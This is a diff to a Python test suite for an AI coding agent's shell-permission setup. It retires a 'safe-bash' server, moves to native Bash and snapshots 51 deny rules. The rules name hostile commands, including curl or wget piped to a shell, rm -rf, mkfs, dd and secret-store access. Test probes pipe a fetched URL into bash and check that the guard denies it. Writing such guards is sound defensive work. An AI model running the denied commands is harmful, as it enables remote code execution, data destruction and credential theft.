@@ -436,6 +436,166 @@ check(
 with open(os.path.join(REPO_ROOT, "settings.json"), encoding="utf-8") as fh:
     SETTINGS = json.load(fh)
 
+
+# ----------------------------------------------------------------------
+# The switchover itself: the permission surface native `Bash` runs on.
+#
+# THE FINDING THIS SECTION PINS (parity rows L1, L2, A7). safe-bash had no
+# allow/ask concept whatsoever — `_deny_rules_from_config` read ONLY
+# `permissions.deny`. Every command it did not deny ran with no permission
+# prompt, because `mcp__safe-bash__*` sat in `permissions.allow`. Meanwhile
+# `permissions.deny` carried a tool-wide `"Bash"` entry, so the CLI's entire
+# Bash permission surface was dead code: 51 deny globs that had never once
+# been consulted in production, and a native tool that was refused outright
+# before any of them could be.
+#
+# Lifting `"Bash"` out of deny brings that surface alive for the first time.
+# What replaces `mcp__safe-bash__*` in `allow` is therefore a DELIBERATE
+# CHOICE, and this is the record of it. Three arms were on the table:
+#
+#   (a) nothing in allow — every command prompts. Safest on paper; it makes
+#       every unattended, headless and subagent run stall on a prompt nobody
+#       is there to answer, and `defaultMode: acceptEdits` does not cover
+#       Bash. Rejected: it is not the posture being migrated, it is a
+#       different product.
+#   (b) `"Bash"` in allow — IDENTICAL risk posture to the one that has been
+#       running for the life of this config, and honest about being identical.
+#       CHOSEN.
+#   (c) a curated allow list — a third vocabulary to keep in step with the
+#       deny globs and the ingress list, invented during a migration whose
+#       whole bar is parity. Rejected as unasked-for scope.
+#
+# Arm (b) does NOT weaken anything, and that is measured rather than argued:
+# `permissions.deny` is consulted before `permissions.allow`, so every deny
+# glob still fires with `Bash` allowed — `tests/test_deny_globs.py` proves it
+# on a real CLI, since every one of its live probes runs under a candidate
+# settings file carrying exactly `{"allow": ["Bash"], "deny": [...]}` and its
+# denials still land. PreToolUse hooks are likewise unaffected: a hook's
+# `deny` overrides an allow rule, which is why `bash-guard.py` never emits an
+# `allow` decision of its own (see K4 below).
+# ----------------------------------------------------------------------
+section("settings.json: the permission surface the switchover creates")
+
+_ALLOW = SETTINGS.get("permissions", {}).get("allow", [])
+_DENY_ALL = SETTINGS.get("permissions", {}).get("deny", [])
+
+check(
+    # L1. Until this is gone the guards are unreachable: the CLI refuses the
+    # tool before any hook or glob is consulted.
+    "the tool-wide `Bash` deny is GONE — native Bash is reachable at all",
+    "Bash" not in _DENY_ALL,
+    "`\"Bash\"` in permissions.deny refuses the native tool outright, which "
+    "makes every guard in this suite dead code",
+)
+check(
+    # L2. The dead entry for a server that no longer exists.
+    "the retired MCP's allow entry is gone",
+    not [r for r in _ALLOW if "safe-bash" in r],
+    f"still in allow: {[r for r in _ALLOW if 'safe-bash' in r]}",
+)
+check(
+    # A7 / W11, arm (b). Absence here is not neutral: it silently converts
+    # every Bash call in every unattended run into a permission prompt.
+    "arm (b) is in force: `Bash` is allowed, matching the posture safe-bash had",
+    "Bash" in _ALLOW,
+    "permissions.allow must carry `Bash`; see the block comment above for why "
+    "the other two arms were rejected",
+)
+check(
+    "`ask` stays empty — the switchover adds no new prompt surface",
+    SETTINGS.get("permissions", {}).get("ask", []) == [],
+    f"ask={SETTINGS.get('permissions', {}).get('ask')!r}",
+)
+
+# L4/L10. Nothing in the live settings surface may still name the retired
+# tool — not a matcher, not a permission rule, not a hook command line.
+with open(os.path.join(REPO_ROOT, "settings.json"), encoding="utf-8") as fh:
+    _settings_text = fh.read()
+check(
+    "no matcher, rule or hook command in settings.json names the retired MCP",
+    "safe-bash" not in _settings_text,
+    "grep -n safe-bash settings.json",
+)
+
+# L3. The registration, and the `DCG_PATH` handoff it carried. Removing the
+# server removes the only place DCG_PATH was exported to the guard, so the
+# fallback chain in `_dcg_path()` is what keeps dcg resolvable — asserted
+# behaviourally by the DCG_PATH-unset rows further down (parity row B3).
+_mcp_servers_path = os.path.join(REPO_ROOT, "mcp-servers.json")
+with open(_mcp_servers_path, encoding="utf-8") as fh:
+    _MCP_SERVERS = json.load(fh)
+check(
+    "mcp-servers.json no longer registers the safe-bash server",
+    "safe-bash" not in _MCP_SERVERS,
+    f"servers: {sorted(_MCP_SERVERS)}",
+)
+check(
+    "no surviving server registration smuggles the retired server back in",
+    not [k for k in _MCP_SERVERS if "safe-bash" in k],
+    f"servers: {sorted(_MCP_SERVERS)}",
+)
+
+# The migration is not half-done: the source tree the port was made from is
+# gone, so nothing can quietly keep depending on it.
+check(
+    "mcps/safe-bash/ is deleted",
+    not os.path.exists(os.path.join(REPO_ROOT, "mcps", "safe-bash")),
+    "the port's source of truth is snapshotted in this file (SOURCE_BASH_RULES); "
+    "leaving the tree in place invites a consumer that outlives the migration",
+)
+check(
+    "the sibling MCP tree is untouched",
+    os.path.isdir(os.path.join(REPO_ROOT, "mcps", "egress-guard")),
+    "mcps/ itself is not being emptied — only safe-bash retires",
+)
+
+# ----------------------------------------------------------------------
+# Parity row A5, recorded rather than lost. safe-bash re-read its config on
+# EVERY call, so editing a deny rule took effect immediately. That property
+# survives on one side of the split and not the other, and an operator who
+# does not know which is which will edit a rule and believe it is in force.
+#
+#   ingress vocabulary  -> hooks/bash-guard-config.json, opened inside the
+#                          hook's own run, in a process the CLI spawns per
+#                          tool call. Still hot: edit it, next command sees it.
+#   deny globs          -> settings.json permissions.deny, read by the CLI at
+#                          SESSION START and snapshotted. Editing a deny rule
+#                          does NOT take effect until a new session.
+#
+# The checks below assert the mechanism, so this stops being a claim.
+# ----------------------------------------------------------------------
+section("settings.json deny rules are snapshotted; the ingress list is not")
+
+with open(os.path.join(HOOKS, "bash-output-guard.py"), encoding="utf-8") as fh:
+    _post_src = fh.read()
+with open(os.path.join(HOOKS, "bash-guard.py"), encoding="utf-8") as fh:
+    _pre_src = fh.read()
+check(
+    "the ingress list is opened inside the per-call hook run, so edits are hot",
+    any(
+        line.startswith((" ", "\t")) and "open(CONFIG_PATH" in line
+        for line in _post_src.splitlines()
+    ),
+    "an import-time read would snapshot it too, and the asymmetry above would "
+    "become a lie in the other direction",
+)
+# If a guard ever starts reading settings.json at runtime, the snapshot note
+# above stops being true, and this row is where that gets noticed. Comments
+# are excluded on purpose: both guards DESCRIBE settings.json at length, and
+# describing it is not reading it.
+_settings_reads = [
+    line.strip()
+    for line in (_pre_src + "\n" + _post_src).splitlines()
+    if "settings.json" in line
+    and not line.lstrip().startswith("#")
+    and ("open(" in line or "json.load" in line)
+]
+check(
+    "neither guard reads settings.json at runtime — the deny globs are the CLI's",
+    not _settings_reads,
+    f"runtime read(s): {_settings_reads}",
+)
+
 _pre = SETTINGS.get("hooks", {}).get("PreToolUse", [])
 _guard_entries = [
     (entry, hook)
@@ -993,54 +1153,248 @@ for cmd in BENIGN:
     check(f"benign command survives every deny rule: {cmd!r}", not hits, f"hit by {hits}")
 
 # The port must be complete: compare against the source of truth it came from.
-_bc_path = os.path.join(REPO_ROOT, "mcps", "safe-bash", "bash-config.json")
-if os.path.exists(_bc_path):
-    with open(_bc_path, encoding="utf-8") as fh:
-        _bc = json.load(fh)
-    _source_rules = [
-        r
-        for r in (_bc.get("permissions", {}).get("deny", []))
-        if isinstance(r, str) and r.startswith("Bash(")
-    ]
-    # NOT a blanket superset pin any more. A blanket superset made narrowing a
-    # defective rule impossible by construction, which collides head-on with
-    # "defects are FIXED in the port, not faithfully reproduced". What it
-    # asserts now is the INTENDED relationship: every source rule is either
-    # carried over or named in RETIRED_RULES with its reason. Delete a rule
-    # without adding a row and this still goes red.
-    _unported = [r for r in _source_rules if r not in DENY and r not in RETIRED_RULES]
-    check(
-        "no Bash(...) rule left behind in bash-config.json, except by named retirement",
-        not _unported,
-        f"unported: {_unported}",
+#
+# THE DEFECT THIS REPLACES (parity row M2, work item W7). This block used to
+# `open()` `mcps/safe-bash/bash-config.json` and wrap every completeness
+# assertion in `if os.path.exists(...)`. The migration DELETES that directory,
+# so on the commit that completes the switchover the entire completeness pin
+# would have evaporated — silently, printing nothing, while the suite stayed
+# green. That is the same fail-open shape the migration exists to correct, and
+# a guard test may not ship it.
+#
+# So the source list is SNAPSHOTTED HERE, as data. It is the 51 `Bash(...)`
+# rules `mcps/safe-bash/bash-config.json` carried at the moment of deletion:
+# git blob c1fb2b287e31a14381a200938c5d2b28705397ea, reachable from commit
+# 6f4f04c9bc41918786d0c041a9378879da9cca02, which is the last commit before
+# the delete. Every assertion below now runs unconditionally, forever, with no
+# dependency on a tree that no longer exists.
+SOURCE_BASH_RULES: list[str] = [
+    "Bash(sudo)",
+    "Bash(sudo *)",
+    "Bash(rm -rf *)",
+    "Bash(rm -fr *)",
+    "Bash(mkfs *)",
+    "Bash(mkfs.*)",
+    "Bash(dd *)",
+    "Bash(curl *|bash*)",
+    "Bash(curl *| bash*)",
+    "Bash(curl *|sh*)",
+    "Bash(curl *| sh*)",
+    "Bash(wget *|bash*)",
+    "Bash(wget *| bash*)",
+    "Bash(git push --force*)",
+    "Bash(git push *--force*)",
+    "Bash(git push -f*)",
+    "Bash(git push *-f *)",
+    "Bash(git reset --hard*)",
+    "Bash(gh pr merge)",
+    "Bash(gh pr merge *)",
+    "Bash(*gh pr create*--base*)",
+    "Bash(*gh pr create*-B *)",
+    "Bash(secret-tool*)",
+    "Bash(docker exec research-agent*)",
+    "Bash(docker exec -* research-agent*)",
+    "Bash(docker inspect*research-agent*)",
+    "Bash(docker logs*research-agent*)",
+    "Bash(docker cp*research-agent*)",
+    "Bash(echo BLOCKED_TEST_STRING*)",
+    "Bash(* BLOCKED_TEST_COMPOUND *)",
+    "Bash(echo BLOCKED_TEST_ESCAPED\\*)",
+    "Bash(BLOCKED_TEST_SUBCMD*)",
+    "Bash(*quarantine*)",
+    "Bash(*/run/agenix/*)",
+    "Bash(*docs.googleapis.com*)",
+    "Bash(*www.googleapis.com/drive*)",
+    "Bash(*discovery/v1/apis/docs*)",
+    "Bash(*googleapiclient*)",
+    "Bash(*from googleapiclient*)",
+    'Bash(*build("docs"*)',
+    "Bash(*build('docs'*)",
+    'Bash(*build("drive"*)',
+    "Bash(*build('drive'*)",
+    "Bash(*documents().batchUpdate*)",
+    "Bash(*documents().get*)",
+    "Bash(*documents().create*)",
+    "Bash(*automation-review*)",
+    "Bash(*prompts.jsonl*)",
+    "Bash(*aut*review*)",
+    "Bash(*review*prompt*)",
+    "Bash(*prompt*review*)",
+]
+
+section("the retired MCP's rule list, snapshotted so the pin outlives the delete")
+check(
+    "the snapshot is the whole source list",
+    len(SOURCE_BASH_RULES) == 51 == len(set(SOURCE_BASH_RULES)),
+    f"{len(SOURCE_BASH_RULES)} rules, {len(set(SOURCE_BASH_RULES))} distinct",
+)
+
+# A literal transcribed by hand is a literal that can be transcribed wrong,
+# and a wrong snapshot would EXCUSE a rule from the completeness pin below —
+# exactly the failure it exists to prevent. Git still holds the deleted blob,
+# so the snapshot is cross-checked against it. If git cannot answer (no repo,
+# shallow clone, exported tarball) the row says so IN THOSE WORDS rather than
+# passing: "not cross-checked" must never print the same as "cross-checked".
+_BLOB = "c1fb2b287e31a14381a200938c5d2b28705397ea"
+try:
+    _blob_out = subprocess.run(
+        ["git", "cat-file", "blob", _BLOB],
+        cwd=REPO_ROOT, capture_output=True, text=True, timeout=20,
     )
-    _untested = [
-        r
-        for r in _source_rules
-        if r not in {p for p, _ in PORTED_RULES} and r not in RETIRED_RULES
-    ]
-    check(
-        "every source rule has a test row or a retirement row",
-        not _untested,
-        f"untested: {_untested}",
+    _blob_rules = (
+        [
+            r
+            for r in json.loads(_blob_out.stdout).get("permissions", {}).get("deny", [])
+            if isinstance(r, str) and r.startswith("Bash(")
+        ]
+        if _blob_out.returncode == 0
+        else None
     )
-    # A retirement claimed but not carried out is the worse failure of the
-    # two: the rule is still live, still refusing ordinary commands, and now
-    # excused from the completeness pin as well.
-    _false_retirements = [r for r in RETIRED_RULES if r in DENY]
-    check(
-        "every retired rule really is absent from settings.json",
-        not _false_retirements,
-        f"still present: {_false_retirements}",
+except (OSError, ValueError, subprocess.SubprocessError):
+    _blob_rules = None
+if _blob_rules is None:
+    print(
+        f"  [ -- ] snapshot NOT cross-checked against git blob {_BLOB[:12]} "
+        f"(git could not read it here); the rows below still ran against the "
+        f"snapshot as written"
     )
-    _phantom_retirements = [r for r in RETIRED_RULES if r not in _source_rules]
+else:
     check(
-        # Otherwise RETIRED_RULES becomes a place to park rules that were
-        # never in the source, and the pin stops meaning anything.
-        "every retired rule was actually in bash-config.json to begin with",
-        not _phantom_retirements,
-        f"not in the source: {_phantom_retirements}",
+        f"the snapshot matches the deleted file's git blob {_BLOB[:12]}",
+        _blob_rules == SOURCE_BASH_RULES,
+        f"blob has {len(_blob_rules)} rule(s); differences: "
+        f"{sorted(set(_blob_rules) ^ set(SOURCE_BASH_RULES))}",
     )
+
+_source_rules = SOURCE_BASH_RULES
+# NOT a blanket superset pin any more. A blanket superset made narrowing a
+# defective rule impossible by construction, which collides head-on with
+# "defects are FIXED in the port, not faithfully reproduced". What it
+# asserts now is the INTENDED relationship: every source rule is either
+# carried over or named in RETIRED_RULES with its reason. Delete a rule
+# without adding a row and this still goes red.
+_unported = [r for r in _source_rules if r not in DENY and r not in RETIRED_RULES]
+check(
+    "no Bash(...) rule left behind in bash-config.json, except by named retirement",
+    not _unported,
+    f"unported: {_unported}",
+)
+_untested = [
+    r
+    for r in _source_rules
+    if r not in {p for p, _ in PORTED_RULES} and r not in RETIRED_RULES
+]
+check(
+    "every source rule has a test row or a retirement row",
+    not _untested,
+    f"untested: {_untested}",
+)
+# A retirement claimed but not carried out is the worse failure of the
+# two: the rule is still live, still refusing ordinary commands, and now
+# excused from the completeness pin as well.
+_false_retirements = [r for r in RETIRED_RULES if r in DENY]
+check(
+    "every retired rule really is absent from settings.json",
+    not _false_retirements,
+    f"still present: {_false_retirements}",
+)
+_phantom_retirements = [r for r in RETIRED_RULES if r not in _source_rules]
+check(
+    # Otherwise RETIRED_RULES becomes a place to park rules that were
+    # never in the source, and the pin stops meaning anything.
+    "every retired rule was actually in bash-config.json to begin with",
+    not _phantom_retirements,
+    f"not in the source: {_phantom_retirements}",
+)
+
+# ----------------------------------------------------------------------
+# A9 / W13 — the three vocabularies must agree.
+#
+# safe-bash read ONE config file per call, and that single read fed both its
+# deny layer and its ingress layer, so the two could not disagree within a
+# call. The port splits that into THREE sources with three different reload
+# lifetimes:
+#
+#   1. settings.json permissions.deny  — the CLI's, snapshotted at session start
+#   2. hooks/bash-guard-config.json    — the ingress list, re-read per call
+#   3. bash-guard.py `_PIPE_SOURCE_COMMANDS` — a hard-coded frozenset
+#
+# 2 and 3 were already bound to each other by set-equality in
+# tests/test_bash_guard_pre.py. NOTHING bound 1 to either, and 1 is where the
+# six `curl *|bash*` rules used to live. Their retirement is justified by
+# "bash-guard.py layer 3 does it now" — a claim that is only true while the
+# fetch heads those rules named are still in the frozenset that drives layer
+# 3, and while the sink words they named still have live deny rules. Change
+# any one of the three and the justification silently stops holding.
+# ----------------------------------------------------------------------
+section("the three deny/ingress vocabularies agree (A9)")
+
+
+def rule_content_of(rule: str) -> str:
+    """`Bash(x)` -> `x`, as the CLI's settings-rule parser hands it over."""
+    return rule[rule.index("(") + 1 : -1]
+
+
+with open(os.path.join(HOOKS, "bash-guard-config.json"), encoding="utf-8") as fh:
+    _INGRESS_CFG = json.load(fh)
+_INGRESS_SINGLE = set(_INGRESS_CFG.get("untrusted_ingress_single") or {})
+_PIPE_HEADS = set(bash_guard._PIPE_SOURCE_COMMANDS)
+
+check(
+    "source 3 (the frozenset) is a subset of source 2 (the ingress list)",
+    _PIPE_HEADS <= _INGRESS_SINGLE,
+    f"only in the frozenset: {sorted(_PIPE_HEADS - _INGRESS_SINGLE)}",
+)
+
+# The fetch heads the six retired pipe rules named, parsed out of the rule
+# text rather than re-typed — a hand-typed list here could drift away from
+# RETIRED_RULES and the binding would be to nothing.
+_retired_pipe_rules = [
+    r for r in RETIRED_RULES
+    if "|" in rule_content_of(r) and "pattern spans a pipe" in RETIRED_RULES[r]
+]
+check(
+    "the six retired pipe rules are still the ones being accounted for",
+    len(_retired_pipe_rules) == 6,
+    f"found {len(_retired_pipe_rules)}: {sorted(_retired_pipe_rules)}",
+)
+_retired_fetch_heads = {rule_content_of(r).split(None, 1)[0] for r in _retired_pipe_rules}
+_retired_sinks = {
+    rule_content_of(r).split("|", 1)[1].strip().split(None, 1)[0].rstrip("*")
+    for r in _retired_pipe_rules
+}
+check(
+    "every fetch head a retired pipe rule named is in the frozenset that "
+    "drives its replacement",
+    _retired_fetch_heads <= _PIPE_HEADS,
+    f"named by a retired rule but unknown to bash-guard.py layer 3: "
+    f"{sorted(_retired_fetch_heads - _PIPE_HEADS)} "
+    f"(retired={sorted(_retired_fetch_heads)} frozenset={sorted(_PIPE_HEADS)})",
+)
+check(
+    "every fetch head a retired pipe rule named is also tagged on ingress",
+    _retired_fetch_heads <= _INGRESS_SINGLE,
+    f"untagged: {sorted(_retired_fetch_heads - _INGRESS_SINGLE)}",
+)
+_sink_rules_live = {s for s in _retired_sinks if f"Bash({s})" in DENY}
+check(
+    "every sink word a retired pipe rule named still has a live deny rule",
+    _sink_rules_live == _retired_sinks,
+    f"sinks named by retired rules: {sorted(_retired_sinks)}; with a live "
+    f"Bash(<sink>) rule in settings.json: {sorted(_sink_rules_live)}",
+)
+
+# And the behaviour the three together are supposed to produce, for every
+# fetch head in the frozenset — not just the `curl` the rows above happen to
+# use. A head added to the frozenset without layer 3 handling it goes red.
+for _head in sorted(_PIPE_HEADS):
+    _dec_v, _why_v = guard(f"{_head} https://example.invalid/x | bash")
+    check(
+        f"the three vocabularies produce a deny for {_head!r} piped to a shell",
+        _dec_v == "deny" and BROKEN_MARKER not in _why_v,
+        f"decision={_dec_v!r} {_why_v[:200]}",
+    )
+
 
 # A retirement without a surviving replacement is a dropped feature wearing a
 # justification. Each family's replacement must be live in settings.json.
